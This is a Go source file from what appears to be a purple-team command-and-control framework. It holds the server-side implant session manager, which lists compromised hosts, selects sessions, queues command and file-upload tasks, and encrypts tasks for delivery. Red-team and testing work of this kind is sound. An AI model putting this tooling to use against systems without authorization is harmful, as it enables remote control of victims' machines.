package implant

import (
	"encoding/binary"
	"errors"
	"fmt"
	"purpcmd/implant"
	"purpcmd/internal/encrypt"
	"purpcmd/server/log"
	"time"

	"github.com/cheynewallace/tabby"
	"github.com/google/uuid"
)

var (
	ImplantMAP            = make(map[string]*Implant)
	CurrentImplant string = "none"
)

func (i *Implant) ImplantAddImplant() {
	/*if CurrentImplant == "none" {
		CurrentImplant = i.Name
	}*/
	ImplantMAP[i.Name] = i
}

func ImplantNew(name string) *Implant {
	n := time.Now()
	return &Implant{
		Name:      name,
		UUID:      uuid.NewString(),
		Alive:     true,
		LastSeen:  n,
		FirstSeen: n,
		TaskMap:   make(map[[8]byte]*Task),
	}
}

func (i *Implant) ImplantSetEncryption(enc encrypt.Encrypt) {
	i.Enc = enc
}

func (i *Implant) ImplantSetMetadata(m *implant.ImplantMetadata) {
	i.Metadata = *m
}

func ImplantList() {
	if len(ImplantMAP) == 0 {
		log.PrintAlert("no session")
	}

	t := tabby.New()
	c := 1
	t.AddHeader("N", "NAME", "USERNAME", "MACHINE", "UUID", "SOCKET", "PID", "SLEEP", "LAST SEEN", "STATUS")
	for k, v := range ImplantMAP {

		lastS := int(time.Since(v.LastSeen).Seconds())
		aux := "s"
		if lastS > 360 {
			lastS = int(time.Since(v.LastSeen).Minutes())
			aux = "m"
			if lastS > 360 {
				lastS = int(time.Since(v.LastSeen).Hours())
				aux = "h"
			}
		}
		status := "\u001B[1;32mhealthy\u001B[0;0m"
		if time.Since(v.LastSeen).Seconds() > float64(v.Metadata.Sleep) {
			status = "\u001B[1;31mdead\u001B[0;0m"
		}

		t.AddLine(c, k, v.Metadata.User, v.Metadata.Hostname, v.UUID[24:], v.Metadata.Socket, v.Metadata.PID, v.Metadata.Sleep, fmt.Sprintf("%d%s ago", lastS, aux), status)
		c += 1
	}
	print("\n")
	t.Print()
	print("\n")
}

func ImplantDelete() error {
	if ImplantMAP[CurrentImplant] != nil {
		if ImplantMAP[CurrentImplant].Alive {
			return errors.New("listener is running")
		}

		delete(ImplantMAP, CurrentImplant)
		log.PrintSuccs("Session " + CurrentImplant + " deleted")
		CurrentImplant = "none"
	} else {
		return errors.New("no listener")
	}
	return nil
}

func ImplantInteract(name string) error {
	if ImplantMAP[name] == nil {
		return errors.New("no implant")
	}
	CurrentImplant = name
	return nil
}

func (i *Implant) ImplantSetAlive() {
	if !i.Alive {
		i.Alive = true
	}
}

func (i *Implant) ImplantSetRemoteSocket(socket string) {
	i.Metadata.Socket = socket
}

func ImplantPtrByName(name string) *Implant {
	return ImplantMAP[name]
}

func (i *Implant) ImplantUpdateLastseen() {
	i.LastSeen = time.Now()
}

func ImplantCount() int {
	return len(ImplantMAP)
}

func ImplantAddTask() {
	if CurrentImplant == "none" {
		return
	}
	t := TaskNew(0x01, []byte("ping"))
	ImplantMAP[CurrentImplant].ImplantAddTask(t)
}

func ImplantAddGenericTask(code int, payload string) int {
	if CurrentImplant == "none" {
		return 1
	}
	t := TaskNew(uint16(code), []byte(payload))
	ImplantMAP[CurrentImplant].ImplantAddTask(t)
	return 0
}

func ImplantAddUploadTask(code int, name string, data []byte) int {
	if CurrentImplant == "none" {
		return 1
	}

	var Buff []byte
	nameLen := uint16(len(name))
	nameLenBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(nameLenBytes, nameLen)
	Buff = append(Buff, nameLenBytes...)

	Buff = append(Buff, []byte(name)...)

	dataLen := uint32(len(data))
	dataLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(dataLenBytes, dataLen)
	Buff = append(Buff, dataLenBytes...)

	// Write data
	Buff = append(Buff, data...)

	t := TaskNew(uint16(code), Buff)
	ImplantMAP[CurrentImplant].ImplantAddTask(t)
	return 0
}

func (i *Implant) ImplantAddTask(task *Task) {
	i.Task = append(i.Task, task)
	i.TaskMap[task.ID] = task
	log.PrintInfo("new task added: ", string(task.ID[:]))
}

func (i *Implant) ImplantGetTaskStr() (string, [8]byte, error) {
	t, err := i.TaskGet()
	if err != nil {
		return "", [8]byte{}, err
	}

	t.Sent = true
	tb := t.TaskMarshal()
	tbe := i.Enc.AESCbcEncrypt(tb)
	i.Enc.HMACPackAddHmac(&tbe)
	return TaskEncode(tbe), t.ID, nil
}

func ImplantListForSuggestions() [][]string {
	var suggestions [][]string
	for k, v := range ImplantMAP {
		suggestions = append(suggestions, []string{k, v.Metadata.Hostname+"@"+v.Metadata.User})
	}
	return suggestions
}

func ImplantGetType() string {
	return ImplantMAP[CurrentImplant].Metadata.Impl
}